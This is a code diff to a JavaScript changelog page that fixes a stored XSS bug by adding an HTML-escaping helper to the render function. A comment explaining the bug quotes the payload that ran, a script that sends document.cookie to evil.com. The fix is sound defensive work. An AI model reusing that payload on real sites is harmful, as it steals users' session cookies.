@@ -529,18 +529,33 @@ const TAG_COLORS = {
   improvement: { bg: '#eaf1fb', color: '#185fa5' },
 };
 
+// 2026-04-29 SECURITY: stored XSS in this very file. The K3-K6 entry below
+// contains a literal `<script>fetch('//evil.com?c='+document.cookie)</script>`
+// describing the bug we fixed — but renderChangelog() was interpolating
+// e.title / i.text raw, so that string actually executed (CORS blocked the
+// network call but the script ran). Caught by the Playwright UI audit on
+// 2026-04-29 when a request to evil.com fired during /changelog navigation.
+// Even though changelog.js is dev-edited, never trust string interpolation
+// without escaping — same principle as every other render path. Hand-rolled
+// escHTML mirrors server.js's helper.
+function escHTML(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, ch => (
+    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch]
+  ));
+}
+
 function renderChangelog() {
   const entriesHTML = ENTRIES.map(e => `
     <div class="ocu-card" style="margin-bottom:14px;padding:18px 20px">
       <div style="border-bottom:1px solid var(--ocu-border-soft, #f0efe9);padding-bottom:10px;margin-bottom:12px">
-        <div style="font-size:11px;color:var(--ocu-text-3);text-transform:uppercase;letter-spacing:.06em;font-weight:600">${e.date}</div>
-        <div style="font-size:15px;font-weight:600;margin-top:4px;color:var(--ocu-text-1)">${e.title}</div>
+        <div style="font-size:11px;color:var(--ocu-text-3);text-transform:uppercase;letter-spacing:.06em;font-weight:600">${escHTML(e.date)}</div>
+        <div style="font-size:15px;font-weight:600;margin-top:4px;color:var(--ocu-text-1)">${escHTML(e.title)}</div>
       </div>
       ${e.items.map(i => {
         const c = TAG_COLORS[i.tag] || { bg: '#f0efe9', color: '#888' };
         return `<div style="display:flex;gap:10px;align-items:flex-start;padding:6px 0">
-          <span style="background:${c.bg};color:${c.color};font-size:10px;text-transform:uppercase;font-weight:600;padding:3px 8px;border-radius:4px;flex-shrink:0;margin-top:2px;min-width:64px;text-align:center;letter-spacing:.04em">${i.tag}</span>
-          <span style="font-size:13px;line-height:1.55;color:var(--ocu-text-1)">${i.text}</span>
+          <span style="background:${c.bg};color:${c.color};font-size:10px;text-transform:uppercase;font-weight:600;padding:3px 8px;border-radius:4px;flex-shrink:0;margin-top:2px;min-width:64px;text-align:center;letter-spacing:.04em">${escHTML(i.tag)}</span>
+          <span style="font-size:13px;line-height:1.55;color:var(--ocu-text-1)">${escHTML(i.text)}</span>
         </div>`;
       }).join('')}
     </div>
